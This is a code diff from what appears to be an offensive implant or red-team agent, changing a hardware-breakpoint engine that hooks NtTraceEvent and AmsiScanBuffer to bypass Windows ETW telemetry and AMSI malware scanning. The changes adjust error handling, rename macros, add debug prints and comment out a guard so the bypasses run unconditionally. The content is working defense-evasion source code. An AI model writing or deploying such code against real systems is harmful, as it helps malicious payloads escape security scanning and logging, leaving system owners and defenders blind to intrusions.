@@ -73,7 +73,7 @@ auto DECLFN HwbpEng::SetBreak(
         Self->Ntdll.RtlCaptureContext( &Ctx );
     }
     
-    if (!NT_SUCCESS(Status)) {
+    if ( !NT_SUCCESS( Status) && ThreadID != Self->Session.ThreadID ) {
         if ( Handle != NtCurrentThread() ) Self->Ntdll.NtClose( Handle );
         return FALSE;
     }
@@ -88,12 +88,12 @@ auto DECLFN HwbpEng::SetBreak(
     
     if ( Handle != NtCurrentThread() ) {
         Status = Self->Ntdll.NtSetContextThread( Handle, &Ctx );
-        Self->Ntdll.NtClose( Handle );
+        Status = Self->Ntdll.NtClose( Handle );
     } else {
-        Self->Ntdll.NtContinue( &Ctx, FALSE );
+        Status = Self->Ntdll.NtContinue( &Ctx, FALSE );
     }
 
-    return NT_SUCCESS(Status);
+    return NT_SUCCESS( Status );
 }
 
 auto DECLFN HwbpEng::Uninstall(
@@ -164,7 +164,7 @@ auto DECLFN HwbpEng::GetArg(
 
     return C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) );
 #else
-    return C_DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) );
+    return DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) );
 #endif
 }
 
@@ -190,7 +190,7 @@ switch ( Idx ) {
 }
     C_DEF64( Ctx->Rsp + ( Idx * sizeof( PVOID ) ) ) = Val;
 #else
-    C_DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) ) = Val;
+    DEF32( Ctx->Esp + ( Idx * sizeof( PVOID ) ) ) = Val;
 #endif
 }
 
@@ -410,7 +410,9 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
 
     BOOL Success = FALSE;
 
-    if ( this->DotnetBypass ) {
+    KhDbg( "%d", this->DotnetBypass );
+
+    // if ( this->DotnetBypass ) {
 
         if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
             if ( !this->Etw.NtTraceEvent ) {
@@ -422,20 +424,26 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
             if ( ! Success ) return Success;
         }
 
-        if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
-            if ( !this->Amsi.Handle ) {
-                this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
+        KhDbg( "dbg" );
 
-                if ( this->Amsi.Handle ) {
-                    this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
-                    KhDbg("AmsiScanBuffer %p", this->Amsi.AmsiScanBuffer );
-                }
+        if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
+            KhDbg( "%p", this->Amsi.Handle );
+            if ( ! this->Amsi.Handle ) {
+                KhDbg( "dbg" );
+                this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
+                KhDbg( "%p", this->Amsi.Handle );
+            }
+
+            if ( this->Amsi.Handle ) {
+                KhDbg( "dbg" );
+                this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
+                KhDbg("AmsiScanBuffer %p", this->Amsi.AmsiScanBuffer );
             }
 
             Success = this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
             if ( ! Success ) return Success;
         }
-    }
+    // }
 
     return Success;
 }
